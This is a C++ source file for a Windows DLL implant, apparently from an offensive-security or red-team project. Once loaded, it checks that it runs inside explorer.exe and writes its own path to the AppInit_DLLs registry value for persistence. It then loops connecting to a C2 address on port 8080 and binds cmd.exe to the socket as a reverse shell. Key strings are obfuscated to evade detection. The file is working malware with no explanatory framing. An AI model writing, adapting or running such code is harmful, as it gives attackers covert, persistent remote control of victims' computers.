#include "stdafx.h"
#include "obfuscate.h"

#define DEFAULT_BUFLEN 1024
#define MAXPATH 255

void runShell(char* C2Server, int C2Port)
{
	while (1)
	{
		Sleep(5000);

		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;
		WSAStartup(MAKEWORD(2, 2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;

		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);

		// connect to proxy/proxy IP/C2Host
		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
		{
			closesocket(mySocket);
			WSACleanup();
			continue;
		}
		else
		{
			char RecvData[DEFAULT_BUFLEN];
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
			if (RecvCode <= 0)
			{
				closesocket(mySocket);
				WSACleanup();
				continue;
			}
			else
			{
				char Process[8];
				strcpy(Process, obf::decode("\xcd\xe6\xcc\xb9\xe9\xd5\xe9").c_str()); // cmd.exe
				STARTUPINFOA sinfo;
				PROCESS_INFORMATION pinfo;

				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;

				CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, "C:\\", &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);

				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);

				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
				if (RecvCode <= 0)
				{
					closesocket(mySocket);
					WSACleanup();
					continue;
				}
				if (strcmp(RecvData, "exit\n") == 0)
					exit(0);
			}
		}
	}
}

extern "C" _declspec(dllexport)
DWORD WINAPI start(LPVOID lpParam)
{
	char exePath[MAXPATH];

	GetModuleFileNameA(NULL, exePath, MAXPATH);

	std::string exePathStr(exePath);
	std::string baseFile = exePathStr.substr(exePathStr.find_last_of("\\") + 1);

	char targetProcess[13];
	strcpy(targetProcess, obf::decode("\xcb\xf3\xd8\xfb\xe3\xdf\xe9\xcc\x97\xcb\xec\xfb").c_str()); // explorer.exe

	// make sure this DLL is only running in a specific process
	if (baseFile.compare(targetProcess) != 0) { ExitThread(0); }

	char dllPath[MAXPATH];
	HMODULE hModule;

	GetModuleHandleExA(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		(LPCSTR)&start,
		&hModule
	);

	GetModuleFileNameA(hModule, dllPath, MAXPATH);

	HKEY hKey;
	char AUTORUN_KEY[57];
	// SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows
	strcpy(AUTORUN_KEY, obf::decode("\xfd\xc4\xee\xc3\xdb\xec\xde\xfb\xe5\xf2\xd9\xf7\xf6\xd4\xd6\x8c\xc1\xed\xdc\xcb\xd0\xfa\xe5\xd0\xdd\xc1\xe3\xed\xb5\xe8\xed\xa3\xf2\xc8\xdd\xe5\xfe\xc8\xe2\xca\xef\xcb\xe6\xed\xfc\xc9\xd7\xa3\xf2\xdc\xc1\xf9\xe8\xc2\xfb\xcd").c_str());
	char regKey[13];
	strcpy(regKey, obf::decode("\xef\xfb\xd8\xde\xe2\xc4\xf8\xe1\xfd\xe2\xd8\xed").c_str()); // AppInit_DLLs

	// modify registry for persistence
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, AUTORUN_KEY, NULL, KEY_ALL_ACCESS, &hKey);
	RegSetValueExA((HKEY)hKey, regKey, NULL, REG_SZ, (BYTE*)dllPath, strlen(dllPath));

	char host[15];
	strcpy(host, obf::decode("\x9f\xb2\x9a\xb9\xbd\x9b\xb4\x90\x8c\x98\xba\xaf\xa5\x95").c_str()); // 192.168.56.103
	int port = 8080;
	runShell(host, port);
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		CreateThread(NULL, NULL, start, NULL, NULL, NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
